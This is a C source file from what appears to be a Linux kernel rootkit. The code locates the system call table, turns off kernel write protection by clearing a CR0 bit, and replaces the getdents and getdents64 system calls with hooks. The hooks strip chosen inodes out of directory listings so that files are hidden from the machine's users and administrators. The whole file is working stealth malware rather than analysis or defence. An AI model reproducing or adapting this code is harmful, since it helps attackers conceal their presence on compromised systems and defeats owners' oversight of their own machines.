#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/xattr.h>
#include <linux/fdtable.h>
#include <linux/list.h>

#include "common.h"
#include "hook.h"
#include "rootkit.h"
#include "filehide.h"

extern rootkit_t rootkit;

void **sys_calls;

atomic_t getdents_count;
atomic_t getdents64_count;

asmlinkage long (*sys_getdents)(const struct pt_regs *);
asmlinkage long (*sys_getdents64)(const struct pt_regs *);

struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[1];
};

int
retrieve_sys_call_table(void)
{
    return NULL == (sys_calls
        = (void **)kallsyms_lookup_name("sys_call_table"));
}

void
init_hooks(void)
{
    atomic_set(&getdents_count, 0);
    sys_getdents = (void *)sys_calls[__NR_getdents];

    atomic_set(&getdents64_count, 0);
    sys_getdents64 = (void *)sys_calls[__NR_getdents64];

    if (rootkit.hiding_files)
        hide_files();
}

void
remove_hooks(void)
{
    if (rootkit.hiding_files) {
        while (atomic_read(&getdents_count) > 0);
        disable_protection();
        sys_calls[__NR_getdents] = (void *)sys_getdents;
        enable_protection();

        while (atomic_read(&getdents64_count) > 0);
        disable_protection();
        sys_calls[__NR_getdents64] = (void *)sys_getdents64;
        enable_protection();
    }
}

void
disable_protection(void)
{
    write_cr0(read_cr0() & (~0x10000));
}

void
enable_protection(void)
{
    write_cr0(read_cr0() | 0x10000);
}


// https://elixir.bootlin.com/linux/v4.19/source/arch/x86/entry/syscall_64.c
// https://elixir.bootlin.com/linux/v4.19/source/arch/x86/include/asm/ptrace.h#L12
asmlinkage long
g7_getdents(const struct pt_regs *pt_regs)
{
    typedef struct linux_dirent *dirent_t_ptr;

    unsigned long offset;
    dirent_t_ptr kdirent, cur_kdirent, prev_kdirent;
    struct dentry *kdirent_dentry;

    cur_kdirent = prev_kdirent = NULL;
    int fd = (int)pt_regs->di;
    dirent_t_ptr dirent = (dirent_t_ptr)pt_regs->si;
    long ret = sys_getdents(pt_regs);

    if (ret <= 0 || !(kdirent = (dirent_t_ptr)kzalloc(ret, GFP_KERNEL)))
        return ret;

    if (copy_from_user(kdirent, dirent, ret))
        goto yield;

    atomic_inc(&getdents_count);

    kdirent_dentry = current->files->fdt->fd[fd]->f_path.dentry;

    inode_list_t hidden_inodes = { 0, NULL };
    inode_list_t_ptr hi_head, hi_tail;
    hi_head = hi_tail = &hidden_inodes;

    struct list_head *i;
    list_for_each(i, &kdirent_dentry->d_subdirs) {
        unsigned long inode;
        struct dentry *child = list_entry(i, struct dentry, d_child);

        if ((inode = must_hide_inode(child)))
            hi_tail = add_inode_to_list(hi_tail, inode);
    }

    for (offset = 0; offset < ret;) {
        cur_kdirent = (dirent_t_ptr)((char *)kdirent + offset);

        if (list_contains_inode(hi_head, cur_kdirent->d_ino)) {
            if (cur_kdirent == kdirent) {
                ret -= cur_kdirent->d_reclen;
                memmove(cur_kdirent, (char *)cur_kdirent + cur_kdirent->d_reclen, ret);
                continue;
            }

            prev_kdirent->d_reclen += cur_kdirent->d_reclen;
        } else
            prev_kdirent = cur_kdirent;

        offset += cur_kdirent->d_reclen;
    }

    copy_to_user(dirent, kdirent, ret);
    atomic_dec(&getdents_count);

yield:
    kfree(kdirent);
    return ret;
}

// https://elixir.bootlin.com/linux/v4.19/source/arch/x86/entry/syscall_64.c
// https://elixir.bootlin.com/linux/v4.19/source/arch/x86/include/asm/ptrace.h#L12
asmlinkage long
g7_getdents64(const struct pt_regs *pt_regs)
{
    typedef struct linux_dirent64 *dirent64_t_ptr;

    unsigned long offset;
    dirent64_t_ptr kdirent, cur_kdirent, prev_kdirent;
    struct dentry *kdirent_dentry;

    cur_kdirent = prev_kdirent = NULL;
    int fd = (int)pt_regs->di;
    dirent64_t_ptr dirent = (dirent64_t_ptr)pt_regs->si;
    long ret = sys_getdents64(pt_regs);

    if (ret <= 0 || !(kdirent = (dirent64_t_ptr)kzalloc(ret, GFP_KERNEL)))
        return ret;

    if (copy_from_user(kdirent, dirent, ret))
        goto yield;

    atomic_inc(&getdents64_count);

    kdirent_dentry = current->files->fdt->fd[fd]->f_path.dentry;

    inode_list_t hidden_inodes = { 0, NULL };
    inode_list_t_ptr hi_head, hi_tail;
    hi_head = hi_tail = &hidden_inodes;

    struct list_head *i;
    list_for_each(i, &kdirent_dentry->d_subdirs) {
        unsigned long inode;
        struct dentry *child = list_entry(i, struct dentry, d_child);

        if ((inode = must_hide_inode(child)))
            hi_tail = add_inode_to_list(hi_tail, inode);
    }

    for (offset = 0; offset < ret;) {
        cur_kdirent = (dirent64_t_ptr)((char *)kdirent + offset);

        if (list_contains_inode(hi_head, cur_kdirent->d_ino)) {
            if (cur_kdirent == kdirent) {
                ret -= cur_kdirent->d_reclen;
                memmove(cur_kdirent, (char *)cur_kdirent + cur_kdirent->d_reclen, ret);
                continue;
            }

            prev_kdirent->d_reclen += cur_kdirent->d_reclen;
        } else
            prev_kdirent = cur_kdirent;

        offset += cur_kdirent->d_reclen;
    }

    copy_to_user(dirent, kdirent, ret);
    atomic_dec(&getdents64_count);

yield:
    kfree(kdirent);
    return ret;
}